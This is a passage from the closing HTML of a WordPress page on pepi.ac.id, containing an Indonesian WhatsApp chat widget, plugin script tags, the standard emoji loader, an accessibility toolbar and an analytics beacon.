1-.4-.4l-.1-.6.1-.6.4-.4.5-.3a4.8 4.8 0 0 1 1.2-.2 8.3 8.3 0 0 0 1.2-.2l.4-.3v1zm2.6 1.5v-5c0-.6 0-1.1-.3-1.5l-1-.8-1.4-.4a10.9 10.9 0 0 0-3.1 0l-1.5.6c-.4.2-.7.6-1 1a3 3 0 0 0-.5 1.5h2.7c0-.5.2-.9.5-1a2 2 0 0 1 1.3-.4h.6l.6.2.3.4.2.7c0 .3 0 .5-.3.6-.1.2-.4.3-.7.4l-1 .1a21.9 21.9 0 0 0-2.4.4l-1 .5c-.3.2-.6.5-.8.9-.2.3-.3.8-.3 1.3s.1 1 .3 1.3c.1.4.4.7.7 1l1 .4c.4.2.9.2 1.3.2a6 6 0 0 0 1.8-.2c.6-.2 1-.5 1.5-1a4 4 0 0 0 .2 1H70l-.3-1v-1.2zm-11-6.7c-.2-.4-.6-.6-1-.8-.5-.2-1-.3-1.8-.3-.5 0-1 .1-1.5.4a3 3 0 0 0-1.3 1.2v-5h-2.7v13.4H53v-5.1c0-1 .2-1.7.5-2.2.3-.4.9-.6 1.6-.6.6 0 1 .2 1.3.6.3.4.4 1 .4 1.8v5.5h2.7v-6c0-.6 0-1.2-.2-1.6 0-.5-.3-1-.5-1.3zm-14 4.7l-2.3-9.2h-2.8l-2.3 9-2.2-9h-3l3.6 13.4h3l2.2-9.2 2.3 9.2h3l3.6-13.4h-3l-2.1 9.2zm-24.5.2L18 15.6c-.3-.1-.6-.2-.8.2A20 20 0 0 1 16 17c-.2.2-.4.3-.7.1-.4-.2-1.5-.5-2.8-1.7-1-1-1.7-2-2-2.4-.1-.4 0-.5.2-.7l.5-.6.4-.6v-.6L10.4 8c-.3-.6-.6-.5-.8-.6H9c-.2 0-.6.1-.9.5C7.8 8.2 7 9 7 10.7c0 1.7 1.3 3.4 1.4 3.6.2.3 2.5 3.7 6 5.2l1.9.8c.8.2 1.6.2 2.2.1.6-.1 2-.8 2.3-1.6.3-.9.3-1.5.2-1.7l-.7-.4zM14 25.3c-2 0-4-.5-5.8-1.6l-.4-.2-4.4 1.1 1.2-4.2-.3-.5A11.5 11.5 0 0 1 22.1 5.7 11.5 11.5 0 0 1 14 25.3zM14 0A13.8 13.8 0 0 0 2 20.7L0 28l7.3-2A13.8 13.8 0 1 0 14 0z"/></svg>
								<div class="joinchat__close" title="Tutup"></div>
			</div>
			<div class="joinchat__box__scroll">
				<div class="joinchat__box__content">
					<div class="joinchat__message">Selamat Datang di website PEPI.<br>Ada yang bisa Kami Bantu?</div>				</div>
			</div>
		</div>
		<svg style="width:0;height:0;position:absolute"><defs><clipPath id="joinchat__peak_l"><path d="M17 25V0C17 12.877 6.082 14.9 1.031 15.91c-1.559.31-1.179 2.272.004 2.272C9.609 18.182 17 18.088 17 25z"/></clipPath><clipPath id="joinchat__peak_r"><path d="M0 25.68V0c0 13.23 10.92 15.3 15.97 16.34 1.56.32 1.18 2.34 0 2.34-8.58 0-15.97-.1-15.97 7Z"/></clipPath></defs></svg>
	</div>
<script id="email-subscribers-js-extra">
var es_data = {"messages":{"es_empty_email_notice":"Please enter email address","es_rate_limit_notice":"You need to wait for some time before subscribing again","es_single_optin_success_message":"Successfully Subscribed.","es_email_exists_notice":"Email Address already exists!","es_unexpected_error_notice":"Oops.. Unexpected error occurred.","es_invalid_email_notice":"Invalid email address","es_try_later_notice":"Please try after some time"},"es_ajax_url":"https://pepi.ac.id/wp-admin/admin-ajax.php"};
//# sourceURL=email-subscribers-js-extra
</script>
<script id="email-subscribers-js" src="https://pepi.ac.id/wp-content/plugins/email-subscribers/lite/public/js/email-subscribers-public.js?ver=5.9.24"></script>
<script id="scripts-js" src="https://pepi.ac.id/wp-content/plugins/google-language-translator/js/scripts.js?ver=6.0.20"></script>
<script id="scripts-google-js" src="//translate.google.com/translate_a/element.js?cb=GoogleLanguageTranslatorInit"></script>
<script id="jquery-throttle-js" src="https://pepi.ac.id/wp-content/plugins/bb-theme-builder/js/jquery.throttle.min.js?ver=1.3-alpha.1"></script>
<script id="jquery-fitvids-js" src="https://pepi.ac.id/wp-content/plugins/bb-plugin/js/jquery.fitvids.min.js?ver=1.2"></script>
<script id="fl-builder-layout-bundle-350a9406cc5a277556a04df66970f929-js" src="https://pepi.ac.id/wp-content/uploads/bb-plugin/cache/350a9406cc5a277556a04df66970f929-layout-bundle.js?ver=2.2.1.5-1.3-alpha.1"></script>
<script id="floating-news-headline-ticker-js" src="https://pepi.ac.id/wp-content/plugins/floating-news-headline/build/frontend.js?ver=1.3.3"></script>
<script id="script-dropdownhover-js" src="https://pepi.ac.id/wp-content/themes/vsstem/js/bootstrap-dropdownhover.min.js?ver=1.1.0"></script>
<script id="custom-js" src="https://pepi.ac.id/wp-content/themes/vsstem/js/custom.js?ver=1.1.0"></script>
<script id="vsstem-scripts-js" src="https://pepi.ac.id/wp-content/themes/vsstem/js/theme.min.js?ver=1.1.0"></script>
<script id="joinchat-js" src="https://pepi.ac.id/wp-content/plugins/creame-whatsapp-me/public/js/joinchat.min.js?ver=5.1.7"></script>
<script id="pojo-a11y-js-extra">
var PojoA11yOptions = {"focusable":"","remove_link_target":"","add_role_links":"1","enable_save":"1","save_expiration":"12"};
//# sourceURL=pojo-a11y-js-extra
</script>
<script id="pojo-a11y-js" src="https://pepi.ac.id/wp-content/plugins/pojo-accessibility/assets/js/app.min.js?ver=1.0.0"></script>
<script id="ivory-search-scripts-js-extra">
var IvorySearchVars = {"is_analytics_enabled":"1"};
//# sourceURL=ivory-search-scripts-js-extra
</script>
<script id="ivory-search-scripts-js" src="https://pepi.ac.id/wp-content/plugins/add-search-to-menu/public/js/ivory-search.min.js?ver=5.5.15"></script>
<script id="wp-emoji-settings" type="application/json">
{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://pepi.ac.id/wp-includes/js/wp-emoji-release.min.js?ver=7.0"}}
</script>
<script type="module">
/*! This file is auto-generated */
const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
//# sourceURL=https://pepi.ac.id/wp-includes/js/wp-emoji-loader.min.js
</script>
		<a id="pojo-a11y-skip-content" class="pojo-skip-link pojo-skip-content" tabindex="1" accesskey="s" href="#content">Skip to content</a>
				<nav id="pojo-a11y-toolbar" class="pojo-a11y-toolbar-left pojo-a11y-" role="navigation">
			<div class="pojo-a11y-toolbar-toggle">
				<a class="pojo-a11y-toolbar-link pojo-a11y-toolbar-toggle-link" href="javascript:void(0);" title="Accessibility Tools" role="button">
					<span class="pojo-sr-only sr-only">Open toolbar</span>
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" fill="currentColor" width="1em">
						<title>Accessibility Tools</title>
						<path d="M50 .8c5.7 0 10.4 4.7 10.4 10.4S55.7 21.6 50 21.6s-10.4-4.7-10.4-10.4S44.3.8 50 .8zM92.2 32l-21.9 2.3c-2.6.3-4.6 2.5-4.6 5.2V94c0 2.9-2.3 5.2-5.2 5.2H60c-2.7 0-4.9-2.1-5.2-4.7l-2.2-24.7c-.1-1.5-1.4-2.5-2.8-2.4-1.3.1-2.2 1.1-2.4 2.4l-2.2 24.7c-.2 2.7-2.5 4.7-5.2 4.7h-.5c-2.9 0-5.2-2.3-5.2-5.2V39.4c0-2.7-2-4.9-4.6-5.2L7.8 32c-2.6-.3-4.6-2.5-4.6-5.2v-.5c0-2.6 2.1-4.7 4.7-4.7h.5c19.3 1.8 33.2 2.8 41.7 2.8s22.4-.9 41.7-2.8c2.6-.2 4.9 1.6 5.2 4.3v1c-.1 2.6-2.1 4.8-4.8 5.1z"/>					</svg>
				</a>
			</div>
			<div class="pojo-a11y-toolbar-overlay">
				<div class="pojo-a11y-toolbar-inner">
					<p class="pojo-a11y-toolbar-title">Accessibility Tools</p>
					
					<ul class="pojo-a11y-toolbar-items pojo-a11y-tools">
																			<li class="pojo-a11y-toolbar-item">
								<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-resize-font pojo-a11y-btn-resize-plus" data-action="resize-plus" data-action-group="resize" tabindex="-1" role="button">
									<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>Increase Text</title><path fill="currentColor" d="M256 200v16c0 4.25-3.75 8-8 8h-56v56c0 4.25-3.75 8-8 8h-16c-4.25 0-8-3.75-8-8v-56h-56c-4.25 0-8-3.75-8-8v-16c0-4.25 3.75-8 8-8h56v-56c0-4.25 3.75-8 8-8h16c4.25 0 8 3.75 8 8v56h56c4.25 0 8 3.75 8 8zM288 208c0-61.75-50.25-112-112-112s-112 50.25-112 112 50.25 112 112 112 112-50.25 112-112zM416 416c0 17.75-14.25 32-32 32-8.5 0-16.75-3.5-22.5-9.5l-85.75-85.5c-29.25 20.25-64.25 31-99.75 31-97.25 0-176-78.75-176-176s78.75-176 176-176 176 78.75 176 176c0 35.5-10.75 70.5-31 99.75l85.75 85.75c5.75 5.75 9.25 14 9.25 22.5z"></path></svg></span><span class="pojo-a11y-toolbar-text">Increase Text</span>								</a>
							</li>
							
							<li class="pojo-a11y-toolbar-item">
								<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-resize-font pojo-a11y-btn-resize-minus" data-action="resize-minus" data-action-group="resize" tabindex="-1" role="button">
									<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>Decrease Text</title><path fill="currentColor" d="M256 200v16c0 4.25-3.75 8-8 8h-144c-4.25 0-8-3.75-8-8v-16c0-4.25 3.75-8 8-8h144c4.25 0 8 3.75 8 8zM288 208c0-61.75-50.25-112-112-112s-112 50.25-112 112 50.25 112 112 112 112-50.25 112-112zM416 416c0 17.75-14.25 32-32 32-8.5 0-16.75-3.5-22.5-9.5l-85.75-85.5c-29.25 20.25-64.25 31-99.75 31-97.25 0-176-78.75-176-176s78.75-176 176-176 176 78.75 176 176c0 35.5-10.75 70.5-31 99.75l85.75 85.75c5.75 5.75 9.25 14 9.25 22.5z"></path></svg></span><span class="pojo-a11y-toolbar-text">Decrease Text</span>								</a>
							</li>
						
													<li class="pojo-a11y-toolbar-item">
								<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-background-group pojo-a11y-btn-grayscale" data-action="grayscale" data-action-group="schema" tabindex="-1" role="button">
									<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>Grayscale</title><path fill="currentColor" d="M15.75 384h-15.75v-352h15.75v352zM31.5 383.75h-8v-351.75h8v351.75zM55 383.75h-7.75v-351.75h7.75v351.75zM94.25 383.75h-7.75v-351.75h7.75v351.75zM133.5 383.75h-15.5v-351.75h15.5v351.75zM165 383.75h-7.75v-351.75h7.75v351.75zM180.75 383.75h-7.75v-351.75h7.75v351.75zM196.5 383.75h-7.75v-351.75h7.75v351.75zM235.75 383.75h-15.75v-351.75h15.75v351.75zM275 383.75h-15.75v-351.75h15.75v351.75zM306.5 383.75h-15.75v-351.75h15.75v351.75zM338 383.75h-15.75v-351.75h15.75v351.75zM361.5 383.75h-15.75v-351.75h15.75v351.75zM408.75 383.75h-23.5v-351.75h23.5v351.75zM424.5 383.75h-8v-351.75h8v351.75zM448 384h-15.75v-352h15.75v352z"></path></svg></span><span class="pojo-a11y-toolbar-text">Grayscale</span>								</a>
							</li>
						
													<li class="pojo-a11y-toolbar-item">
								<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-background-group pojo-a11y-btn-high-contrast" data-action="high-contrast" data-action-group="schema" tabindex="-1" role="button">
									<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>High Contrast</title><path fill="currentColor" d="M192 360v-272c-75 0-136 61-136 136s61 136 136 136zM384 224c0 106-86 192-192 192s-192-86-192-192 86-192 192-192 192 86 192 192z"></path></svg></span><span class="pojo-a11y-toolbar-text">High Contrast</span>								</a>
							</li>
						
													<li class="pojo-a11y-toolbar-item">
								<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-background-group pojo-a11y-btn-negative-contrast" data-action="negative-contrast" data-action-group="schema" tabindex="-1" role="button">

									<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>Negative Contrast</title><path fill="currentColor" d="M416 240c-23.75-36.75-56.25-68.25-95.25-88.25 10 17 15.25 36.5 15.25 56.25 0 61.75-50.25 112-112 112s-112-50.25-112-112c0-19.75 5.25-39.25 15.25-56.25-39 20-71.5 51.5-95.25 88.25 42.75 66 111.75 112 192 112s149.25-46 192-112zM236 144c0-6.5-5.5-12-12-12-41.75 0-76 34.25-76 76 0 6.5 5.5 12 12 12s12-5.5 12-12c0-28.5 23.5-52 52-52 6.5 0 12-5.5 12-12zM448 240c0 6.25-2 12-5 17.25-46 75.75-130.25 126.75-219 126.75s-173-51.25-219-126.75c-3-5.25-5-11-5-17.25s2-12 5-17.25c46-75.5 130.25-126.75 219-126.75s173 51.25 219 126.75c3 5.25 5 11 5 17.25z"></path></svg></span><span class="pojo-a11y-toolbar-text">Negative Contrast</span>								</a>
							</li>
						
													<li class="pojo-a11y-toolbar-item">
								<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-background-group pojo-a11y-btn-light-background" data-action="light-background" data-action-group="schema" tabindex="-1" role="button">
									<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>Light Background</title><path fill="currentColor" d="M184 144c0 4.25-3.75 8-8 8s-8-3.75-8-8c0-17.25-26.75-24-40-24-4.25 0-8-3.75-8-8s3.75-8 8-8c23.25 0 56 12.25 56 40zM224 144c0-50-50.75-80-96-80s-96 30-96 80c0 16 6.5 32.75 17 45 4.75 5.5 10.25 10.75 15.25 16.5 17.75 21.25 32.75 46.25 35.25 74.5h57c2.5-28.25 17.5-53.25 35.25-74.5 5-5.75 10.5-11 15.25-16.5 10.5-12.25 17-29 17-45zM256 144c0 25.75-8.5 48-25.75 67s-40 45.75-42 72.5c7.25 4.25 11.75 12.25 11.75 20.5 0 6-2.25 11.75-6.25 16 4 4.25 6.25 10 6.25 16 0 8.25-4.25 15.75-11.25 20.25 2 3.5 3.25 7.75 3.25 11.75 0 16.25-12.75 24-27.25 24-6.5 14.5-21 24-36.75 24s-30.25-9.5-36.75-24c-14.5 0-27.25-7.75-27.25-24 0-4 1.25-8.25 3.25-11.75-7-4.5-11.25-12-11.25-20.25 0-6 2.25-11.75 6.25-16-4-4.25-6.25-10-6.25-16 0-8.25 4.5-16.25 11.75-20.5-2-26.75-24.75-53.5-42-72.5s-25.75-41.25-25.75-67c0-68 64.75-112 128-112s128 44 128 112z"></path></svg></span><span class="pojo-a11y-toolbar-text">Light Background</span>								</a>
							</li>
						
													<li class="pojo-a11y-toolbar-item">
								<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-links-underline" data-action="links-underline" data-action-group="toggle" tabindex="-1" role="button">
									<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>Links Underline</title><path fill="currentColor" d="M364 304c0-6.5-2.5-12.5-7-17l-52-52c-4.5-4.5-10.75-7-17-7-7.25 0-13 2.75-18 8 8.25 8.25 18 15.25 18 28 0 13.25-10.75 24-24 24-12.75 0-19.75-9.75-28-18-5.25 5-8.25 10.75-8.25 18.25 0 6.25 2.5 12.5 7 17l51.5 51.75c4.5 4.5 10.75 6.75 17 6.75s12.5-2.25 17-6.5l36.75-36.5c4.5-4.5 7-10.5 7-16.75zM188.25 127.75c0-6.25-2.5-12.5-7-17l-51.5-51.75c-4.5-4.5-10.75-7-17-7s-12.5 2.5-17 6.75l-36.75 36.5c-4.5 4.5-7 10.5-7 16.75 0 6.5 2.5 12.5 7 17l52 52c4.5 4.5 10.75 6.75 17 6.75 7.25 0 13-2.5 18-7.75-8.25-8.25-18-15.25-18-28 0-13.25 10.75-24 24-24 12.75 0 19.75 9.75 28 18 5.25-5 8.25-10.75 8.25-18.25zM412 304c0 19-7.75 37.5-21.25 50.75l-36.75 36.5c-13.5 13.5-31.75 20.75-50.75 20.75-19.25 0-37.5-7.5-51-21.25l-51.5-51.75c-13.5-13.5-20.75-31.75-20.75-50.75 0-19.75 8-38.5 22-52.25l-22-22c-13.75 14-32.25 22-52 22-19 0-37.5-7.5-51-21l-52-52c-13.75-13.75-21-31.75-21-51 0-19 7.75-37.5 21.25-50.75l36.75-36.5c13.5-13.5 31.75-20.75 50.75-20.75 19.25 0 37.5 7.5 51 21.25l51.5 51.75c13.5 13.5 20.75 31.75 20.75 50.75 0 19.75-8 38.5-22 52.25l22 22c13.75-14 32.25-22 52-22 19 0 37.5 7.5 51 21l52 52c13.75 13.75 21 31.75 21 51z"></path></svg></span><span class="pojo-a11y-toolbar-text">Links Underline</span>								</a>
							</li>
						
													<li class="pojo-a11y-toolbar-item">
								<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-readable-font" data-action="readable-font" data-action-group="toggle" tabindex="-1" role="button">
									<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>Readable Font</title><path fill="currentColor" d="M181.25 139.75l-42.5 112.5c24.75 0.25 49.5 1 74.25 1 4.75 0 9.5-0.25 14.25-0.5-13-38-28.25-76.75-46-113zM0 416l0.5-19.75c23.5-7.25 49-2.25 59.5-29.25l59.25-154 70-181h32c1 1.75 2 3.5 2.75 5.25l51.25 120c18.75 44.25 36 89 55 133 11.25 26 20 52.75 32.5 78.25 1.75 4 5.25 11.5 8.75 14.25 8.25 6.5 31.25 8 43 12.5 0.75 4.75 1.5 9.5 1.5 14.25 0 2.25-0.25 4.25-0.25 6.5-31.75 0-63.5-4-95.25-4-32.75 0-65.5 2.75-98.25 3.75 0-6.5 0.25-13 1-19.5l32.75-7c6.75-1.5 20-3.25 20-12.5 0-9-32.25-83.25-36.25-93.5l-112.5-0.5c-6.5 14.5-31.75 80-31.75 89.5 0 19.25 36.75 20 51 22 0.25 4.75 0.25 9.5 0.25 14.5 0 2.25-0.25 4.5-0.5 6.75-29 0-58.25-5-87.25-5-3.5 0-8.5 1.5-12 2-15.75 2.75-31.25 3.5-47 3.5z"></path></svg></span><span class="pojo-a11y-toolbar-text">Readable Font</span>								</a>
							</li>
																		<li class="pojo-a11y-toolbar-item">
							<a href="#" class="pojo-a11y-toolbar-link pojo-a11y-btn-reset" data-action="reset" tabindex="-1" role="button">
								<span class="pojo-a11y-toolbar-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="1em" viewBox="0 0 448 448"><title>Reset</title><path fill="currentColor" d="M384 224c0 105.75-86.25 192-192 192-57.25 0-111.25-25.25-147.75-69.25-2.5-3.25-2.25-8 0.5-10.75l34.25-34.5c1.75-1.5 4-2.25 6.25-2.25 2.25 0.25 4.5 1.25 5.75 3 24.5 31.75 61.25 49.75 101 49.75 70.5 0 128-57.5 128-128s-57.5-128-128-128c-32.75 0-63.75 12.5-87 34.25l34.25 34.5c4.75 4.5 6 11.5 3.5 17.25-2.5 6-8.25 10-14.75 10h-112c-8.75 0-16-7.25-16-16v-112c0-6.5 4-12.25 10-14.75 5.75-2.5 12.75-1.25 17.25 3.5l32.5 32.25c35.25-33.25 83-53 132.25-53 105.75 0 192 86.25 192 192z"></path></svg></span>
								<span class="pojo-a11y-toolbar-text">Reset</span>
							</a>
						</li>
					</ul>
									</div>
			</div>
		</nav>
		
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"cfd093f89a9a4453ba8932eeb07060db","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>

</html>

